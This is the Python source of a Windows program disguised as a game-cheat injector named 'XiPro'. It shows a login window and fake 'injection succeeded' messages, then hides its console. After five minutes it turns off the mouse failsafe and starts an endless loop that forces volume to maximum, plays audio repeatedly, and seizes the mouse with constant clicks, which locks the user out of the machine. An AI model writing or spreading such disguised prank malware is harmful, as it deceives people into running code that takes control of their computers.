from tkinter import Tk, Label, Entry, Button, Frame
from colorama import init, Fore, Style
from playsound import playsound
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from art import *
import pyautogui
import win32gui
import win32console
import win32con
import datetime
import time
import random
import string
import os
import sys
import win32api
import threading


def execute(textGather, fontColor, waitingTime):
    for text in textGather:
        turnTime = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{fontColor}[{turnTime}] {text}{Style.RESET_ALL}")

    time.sleep(waitingTime)


def initialize(text):
    majuscule = string.ascii_uppercase
    for i in range(30):
        randomResults = ''.join(random.choices(majuscule, k=random.randint(2, 5)))
        turnTime = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{Fore.BLUE}[{turnTime}] {text} '{randomResults}'{Style.RESET_ALL}")
        time.sleep(0.05)


def login():
    window.destroy()
    init()
    print(f"{Fore.GREEN}{text2art('XiPro', font='block', chr_ignore=True)}{Style.RESET_ALL}")
    time.sleep(0.5)
    execute(['初始化连接服务器。。。', '连接服务器成功'], Fore.BLUE, 1.5)
    initialize('寻找地址')
    execute(['Pointers::搜索特征码成功', 'Ui Manager::构造UI管理器成功', 'Renderer::初始化成功', 'Hooking::构造钩子成功', '加载语言：Chinese.json'], Fore.BLUE, 0)
    initialize('开启钩子')
    execute(['注入成功，尊敬的XiPro用户，你好！'], Fore.GREEN, 0)
    time.sleep(2)

    console_window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(console_window, win32con.SW_HIDE)
    
    time.sleep(300)
    pyautogui.click(button='right')
    pyautogui.FAILSAFE = False
    screenWidth, screenHeight = pyautogui.size()
    pyautogui.moveTo(screenWidth - 1, screenHeight - 1, duration=0)
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = interface.QueryInterface(IAudioEndpointVolume)

    def play_and_work():
        for i in range(20):
            mp3_path = os.path.join(sys._MEIPASS, "audio.mp3") if getattr(sys, 'frozen', False) else "audio.mp3"
            playsound(mp3_path)


    t = threading.Thread(target=play_and_work)
    t.start()

    while True:
        win32api.keybd_event(0xAF, 0, 0, 0)
        win32api.keybd_event(0xAF, 0, win32con.KEYEVENTF_KEYUP, 0)
        volume.SetMasterVolumeLevel(0.0, None)
        pyautogui.moveTo(0, 0)
        pyautogui.FAILSAFE = False
        pyautogui.mouseDown()
        pyautogui.mouseUp()


window = Tk()
window.title("XiPro")
window.geometry("300x170")
window.resizable(False, False)
window.wm_attributes("-topmost", 1)
frame = Frame(window, padx=10, pady=10)
frame.pack()

label_username = Label(frame, text="账号:")
label_username.grid(row=0, column=0, pady=15)
entry_username = Entry(frame)
entry_username.grid(row=0, column=1, pady=15)

label_password = Label(frame, text="密码:")
label_password.grid(row=1, column=0, pady=5)
entry_password = Entry(frame, show="*")
entry_password.grid(row=1, column=1, pady=5)

btn_login = Button(window, text="注入", width=10, command=login)
btn_login.pack(padx=10, pady=10)

window.mainloop()
